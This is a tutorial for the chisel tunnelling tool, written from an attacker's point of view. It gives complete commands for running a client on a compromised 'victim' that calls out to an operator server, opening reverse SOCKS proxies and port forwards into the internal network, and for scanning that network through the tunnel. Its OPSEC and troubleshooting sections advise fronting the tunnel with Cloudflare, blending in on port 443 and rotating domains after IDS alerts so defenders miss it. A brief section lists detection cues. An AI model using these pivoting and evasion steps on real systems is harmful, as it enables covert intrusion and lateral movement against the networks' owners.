# Chisel — full tutorial

`chisel` is a TCP/UDP tunnel over HTTP, secured via SSH. Single Go binary that runs as either client or server. Used for pivoting through firewalls when the only allowed outbound is HTTP/HTTPS.

## Install

```terminal
curl -L https://github.com/jpillora/chisel/releases/latest/download/chisel_$(uname -s)_$(uname -m).gz | gunzip > chisel && chmod +x chisel
```

## Server / client model

Server accepts connections (your operator box). Client runs on victim and connects out.

### Server

```terminal
chisel server --port 8080 --reverse --auth user:Pass --tls-key key.pem --tls-cert cert.pem
```

| Flag | Purpose |
|------|---------|
| `--port` / `-p` | Listen port |
| `--host` | Listen iface |
| `--reverse` | Allow client to expose remote port back to operator |
| `--auth user:pass` | Shared secret |
| `--keepalive 25s` | TCP keepalive |
| `--tls-key/--tls-cert` | TLS server cert |
| `--socks5` | Allow client to use built-in SOCKS5 |

### Client

```terminal
chisel client --auth user:Pass --keepalive 25s \
    https://operator.example.com:8080 R:1080:socks
```

| Tunnel spec | Meaning |
|-------------|---------|
| `1080:socks` | Local port 1080 → SOCKS5 in the **server's** machine |
| `R:1080:socks` | Reverse — open SOCKS5 on **operator** that egresses through victim |
| `R:3389:10.0.0.5:3389` | Reverse, expose victim-network 10.0.0.5:3389 to operator at 3389 |
| `R:0.0.0.0:8080:127.0.0.1:8080` | Bind on operator's external iface |
| `R:5985:10.0.0.7:5985` | WinRM over chisel |

## Workflows

### SOCKS through victim (most common)

```terminal
# operator:
chisel server -p 8080 --reverse --auth pwn:pwn

# victim (after foothold):
chisel client --auth pwn:pwn http://operator-ip:8080 R:1080:socks
```

Now operator: `proxychains4 nmap -sT -Pn 10.0.0.0/24` — proxychains uses 127.0.0.1:1080 → tunneled into victim network.

### Single-port forward to internal target

```terminal
# operator:
chisel server -p 8080 --reverse --auth pwn:pwn

# victim:
chisel client --auth pwn:pwn http://operator:8080 R:13389:10.0.0.5:3389
# operator: connect 127.0.0.1:13389 → reaches 10.0.0.5:3389
```

### TLS-encrypted (recommended)

```terminal
# Generate self-signed
openssl req -x509 -nodes -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -subj '/CN=cdn'

# server:
chisel server -p 443 --tls-key key.pem --tls-cert cert.pem --reverse --auth pwn:pwn

# client:
chisel client --auth pwn:pwn https://operator:443 R:1080:socks
```

## Good output

```
2026/04/30 10:00:00 client: Connecting to wss://operator:8080
2026/04/30 10:00:00 client: Connected (Latency 12ms)
2026/04/30 10:00:00 client: 1#1: Listening
```

## Bad output and fixes

| Symptom | Fix |
|---------|-----|
| Client `connection refused` | Check egress, try common ports (443, 80) |
| `tls: handshake failure` | Use `--tls-skip-verify` on client for self-signed |
| Slow throughput | Use `--keepalive` short; close other tunnels |
| Stops after IDS triggers | TLS-wrap; rotate to a domain on Cloudflare in front |

## Defender's perspective

- Long-lived HTTP/WebSocket connection from a workstation to an unknown external IP.
- The handshake is identifiable (chisel sends a specific magic byte). Suricata signatures exist.
- TLS makes it harder, but stable JA3 from one src + long durations is still anomalous.

## OPSEC

- **Always** TLS, **always** unique auth secret.
- Front with Cloudflare so the destination IP looks like Cloudflare to defenders.
- Use port 443 to blend with normal HTTPS.
- Pair with `proxychains4` or `redsocks` on operator side.

## Related tools

| Tool | Niche |
|------|-------|
| **ligolo-ng** | Modern alternative; routes whole subnets, no proxychains needed |
| **Rsockstun** | Cloud-friendly reverse proxy |
| **frp** | Generic reverse proxy (open source) |
| **ngrok** | Commercial tunneling, easier but logged by ngrok |
| **gost** | Multi-protocol tunneling |
